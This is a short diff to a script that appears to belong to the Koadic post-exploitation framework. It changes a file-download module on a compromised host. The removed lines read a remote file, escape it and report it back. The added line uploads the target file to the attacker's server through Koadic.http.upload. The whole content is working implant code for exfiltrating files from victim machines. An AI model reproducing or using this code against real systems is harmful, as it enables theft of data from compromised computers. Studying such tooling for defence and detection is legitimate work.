@@ -1,11 +1,6 @@
 try
 {
-    var data = Koadic.file.readBinary("~RFILE~");
-
-    data = data.replace(/\\/g, "\\\\");
-    data = data.replace(/\0/g, "\\0")
-
-    Koadic.work.report(data);
+    Koadic.http.upload("~RFILEF~", "data");
 }
 catch (e)
 {
